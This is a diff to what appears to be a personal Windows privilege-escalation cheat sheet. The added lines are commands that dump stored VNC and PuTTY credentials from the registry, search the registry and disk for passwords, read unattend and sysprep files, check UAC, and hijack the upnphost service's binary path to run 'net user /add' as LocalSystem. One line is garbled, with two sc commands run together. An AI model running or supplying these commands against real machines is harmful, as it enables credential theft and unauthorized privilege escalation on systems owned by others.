@@ -54,8 +54,10 @@
 - list users
   ~~~sh
   net users
-  # needs admin
-  WMIC /NODE: "BOB" COMPUTERSYSTEM GET USERNAME
+  
+  WMIC /NODE: "BOB" COMPUTERSYSTEM GET USERNAME # needs admin
+  
+  net user %username% /domain | find "Group"
   ~~~
 
 - check cacls
@@ -72,6 +74,40 @@
   #search for passwords in the Windows Registry
   reg query "HKLM\Software\Microsoft\WindowsNT\Currentversion\Winlogon"
   reg query "HKLM\System\CurrentControlSet\Services\SNMP"
+  
+  reg query "HKCU\Software\ORL\WinVNC3\Password"
+  # UAC check
+  REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
+    #EnableLUA    REG_DWORD    0x0  // NO
+    #EnableLUA    REG_DWORD    0x1  // YES
+  
+  reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+  
+  reg query HKLM /f password /t REG_SZ /s [ |clip]
+  reg query HKCU /f password /t REG_SZ /s [ |clip]
+
+  # Change the upnp service binary
+  sc qc upnphostsc config upnphost binpath= "net user /add"
+  sc config upnphost obj= ".\LocalSystem" password =""
+  net stop upnphost
+  net start upnphost
   ~~~
 
+- search credentials
+  ~~~sh
+  dir c:\unattend.xml
+  type c:\sysprep.inf
+  type c:\sysprep\sysprep.xml
+  dir c:\*vnc.ini /s /b
+  dir c:\*ultravnc.ini /s /b
+  dir c:\ /s /b | findstr /si *vnc.ini
+  
+  cd c:\
+  findstr /S pass *.txt *.xml *.ini
+  ~~~
+
+- Copy
+  ~~~sh
+  copy FreeSSHDService.ini c:\"Program Files"\freeSSHd /y
+  ~~~
 
